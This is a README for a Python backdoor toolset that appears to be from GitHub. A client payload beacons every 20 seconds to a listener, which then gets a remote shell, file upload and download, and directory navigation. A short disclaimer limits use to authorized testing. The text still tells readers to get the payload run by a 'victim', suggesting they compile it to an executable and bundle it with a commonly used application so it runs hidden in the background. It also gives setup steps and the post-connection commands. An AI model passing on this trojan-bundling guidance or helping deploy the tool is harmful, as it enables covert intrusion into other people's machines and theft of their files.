# Local_Backdoor_Access

The **Local_Backdoor_Access** project is a simple yet powerful toolset for remote command execution and file transfer between a client and a server using Python.
This tool enables a backdoor connection between a client and a server, allowing remote command execution, file uploads, and downloads over a socket connection.

> **Note:** This tool should only be used in ethical penetration testing scenarios or with explicit permission. Unauthorized use is illegal.

## Features

- **Remote Shell Access:** Control a remote system via a command shell.
- **File Upload and Download:** Transfer files between the client and the server.
- **Clear Command:** Clear the terminal screen on the client or server.
- **Custom Directory Navigation:** Change directories on the target machine.

## How It Works

- **Client:** The client (backdoor.py) attempts to establish a connection to the server (server.py) every 20 seconds. Once connected, it can execute commands, upload/download files, and return results to the server.
  
- **Server:** The server (server.py) listens for incoming client connections. Once connected, it allows you to send commands, upload files to the client, and download files from the client.


>**Note:** backdoor.py is a payload that needs to be executed by the target(victim). You can use various other techniques to make that possible.
        (like converting backdoor.py to .exe and merging it with other mostly used application. So that when target opens the application then the backdoor will execute in background)


### Usage

#### Setting Up the Server

1. Clone the repository:
   
   git clone https://github.com/Vaibhav256/Cybersecurity_Tools/local-backdoor-access

2. Change to directory:

   cd local-backdoor-access

3. Open server.py file:

    nano server.py

4. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
    *(not a command)*
    make changes in the line no. 57 --> default: sock.bind(('0.0.0.0', 5555))

5. Run the Server:

    python server.py

#### Setting Up the Backdoor (Target)

1. Change to directory:

   cd local-backdoor-access

2. Open backdoor.py file:

    nano backdoor.py

3. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
    *(not a command)*
    make changes in the line no. 24 --> default: sock1.connect(('0.0.0.0', 5555))

4. Run the Backdoor or make it execute.
    *if your are checking a demo on your own another device then you may run it like:*
        python backdoor.py 
    *you must have backdoor.py file and python installed on that device*
    *OR you can convert py to executable then python is not necessary to be installed on that device.*

### Commands to use (After connection)

1. quit: Terminates the shell session.
2. upload <file>: Upload a file from the client to the server.
3. download <file>: Download a file from the server to the client.
4. cd <directory>: Change directory on the client.
5. clear: Clear the terminal screen

